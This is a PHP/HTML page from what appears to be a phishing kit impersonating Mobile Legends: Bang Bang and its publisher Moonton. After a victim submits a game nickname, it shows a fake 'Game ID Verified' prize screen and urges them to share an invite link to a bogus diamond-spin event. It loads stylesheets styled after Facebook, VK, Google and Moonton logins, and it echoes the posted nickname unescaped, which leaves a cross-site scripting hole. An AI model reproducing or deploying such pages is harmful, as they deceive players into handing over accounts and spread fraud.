<?php
$nick = $_POST['nick'];
//MENGALIHKAN KE HALAMAN UTAMA JIKA DATA BELUM DI-INPUT
if($nick == ""){
header("Location: ./");
}
?>
<html>

  <head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Oxygen&display=swap" rel="stylesheet">
    <link href='https://unpkg.com/boxicons@2.1.1/css/boxicons.min.css' rel='stylesheet'>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
    <link rel="stylesheet" href="https://rawcdn.githack.com/AlexHostX/all.asset/c9f3ddecc56e688f8660a2d31a5beea4909fa5b9/alex-facebook.css">
    <link rel="stylesheet" href="https://rawcdn.githack.com/AlexHostX/all.asset/3ddd40ca064d997b6655739e7a0e8a65acc106e8/alex-vikontakte.css">
    <link rel="stylesheet" href="https://rawcdn.githack.com/AlexHostX/all.asset/1591ba04a57c11f4b18d2ebb39e03e4a81715c83/alex-google.css">
    <link rel="stylesheet" href="https://rawcdn.githack.com/AlexHostX/all.asset/3fce8843edde49a48905ae1ed9cf237534e547dd/alex-moonton.css">
    <link rel="stylesheet" href="alexFrontEnd/css/style.css" />
    <meta name="keywords" content="MLBB, MLBB Evebt, MLBB Free Skin">
    <meta name="description" content="Get draw and claim your diamond skin now!">
    <meta name="author" content="Alex Ariandi">
    <title>Mobile Legends: Bang Bang</title>
    <meta property="og:url" content="./">
    <meta property="og:site_name" content="Mobile Legends: Bang Bang">
    <meta property="og:type" content="website">
    <meta name="copyright" content="Moonton">
    <meta name="theme-color" content="#4b28cc">
    <link rel="icon" href="https://m.mobilelegends.com/static/images/favicon.ico">
    <meta property="og:image" content="https://cdn.jsdelivr.net/gh/AlexHostX/logAlex@main/mlbb-5v5.webp" />
  </head>

  <body>
    <main>
      <div id="container">
        <div class="content">
          <header>
            <div class="topalex">
              <i class='bx bx-chevron-left'></i>
              <img src="https://cdn.jsdelivr.net/gh/AlexHostX/logAlex@main/mlbb-5v5.webp" alt="icon" />
            </div>
            <h3>Invite Friends to Win <h1>Diamond MLBB</h1>
            </h3>
          </header>
          <section class="completedml">
            <div class="sukseslexml">
              <div class="titlesukses">
                <h3>congratulation to <?php echo $_POST['nick'];?></h3>
              </div>
              <div class="textsukses">
                <p><i class='bx bxs-user-check'></i> Game ID Verified Successfully</p>
                <span>each prize has the fastest delivery of 30 minutes after successfully verifying Game ID</span>
              </div>
              <div class="buttonformalexmlmt">
                <button onclick="location.href='./';">Log Out</button>
              </div>
            </div>
          </section>

          <section class="guestalexml">
            <div class="invitealex">
              <div class="topinvite">
                <p>free leftovers</p>
                <label id="copymore">get more</label>
                <input type="hidden" id="linkmore" value="089509556668" readonly />
              </div>
              <div class="bottinvite">
                <p>0</p>
                <div class="salinlink">
                  <input type="text" id="linkshow" value="089509556668" readonly />
                  <label id="copyalex"><i class='bx bx-copy-alt'></i></label>
                </div>
              </div>
            </div>
            <div class="invitealex">
              <div class="topinvite">
                <p>History</p>
                <label href="#top">Spin Now</label>
              </div>
              <div class="bottinvite">
                <p>Not found</p>
                <div class="salinlink" style="visibility: hidden;">
                  <input type="text" value="089509556668" readonly />
                  <label><i class='bx bx-copy-alt'></i></label>
                </div>
              </div>
            </div>
            <a onclick="openstatus()">Invitation History</a>
            <span id="invitestatus">have not invited</span>

            <div class="rulesalexml">
              <div class="rulesfix">
                <h3>Rules</h3>
                <div class="contentrules">
                  <p>1. invite users to take part in the MLBB Spin Event using the link we have prepared under the prize wheel. Everyone who refers the link will increase your free play count.</p>
                  <p>2. Every time you withdraw a prize, you will receive whatever the pointer points to. To receive the prize, you must fill in your MLBB ID correctly. Once verified, our system will send the reward within 30 minutes.</p>
                  <p>3. Event time limit: <label id="alextimer">25:25</label></p>
                  <p>4. Invite up to 100 users for 100 free prize spin opportunities.</p>
                </div>
              </div>
            </div>
          </section>
        </div>
      </div>
    </main>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script type="text/javascript" src="https://code.jquery.com/jquery-1.10.2.min.js"></script>
    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
    <script type="text/javascript" src="alexFrontEnd/js/function.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@10"></script>
    <script type="text/javascript" src="alexFrontEnd/js/copylink.js"></script>
    <script type="text/javascript" src="alexFrontEnd/js/gotop.js"></script>
    <script type="text/javascript" src="alexFrontEnd/js/timer.js"></script>
  </body>

</html>
